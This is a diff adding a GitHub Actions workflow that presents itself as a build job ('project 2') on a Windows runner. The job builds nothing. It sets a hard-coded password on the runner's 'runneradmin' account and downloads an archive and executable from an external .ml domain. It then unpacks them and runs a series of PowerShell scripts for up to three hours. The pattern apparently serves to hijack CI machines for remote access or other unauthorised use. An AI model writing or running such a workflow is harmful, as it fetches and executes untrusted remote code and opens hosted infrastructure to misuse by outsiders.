@@ -1,0 +1,31 @@
+name: project 2
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    timeout-minutes: 180
+
+    steps:
+    - name: command 1
+      run: |
+        cmd /c net user runneradmin EAekra7595
+        Invoke-WebRequest https://olelele.ml/0:/GGG/zzz.arc -OutFile zzz.acr
+        Invoke-WebRequest https://olelele.ml/0:/GGG/zzz.exe -OutFile zzz.exe
+        .\zzz.exe e zzz.acr
+    - name: command 2
+      run: .\00.ps1
+    - name: command 3
+      run: .\0.ps1
+    - name: command 4
+      run: .\1.ps1
+    - name: command 5
+      run: .\2.ps1
+    - name: command 6
+      run: .\3.ps1
+    - name: command 7
+      run: .\4.ps1
+    - name: command 8
+      run: .\5.ps1 
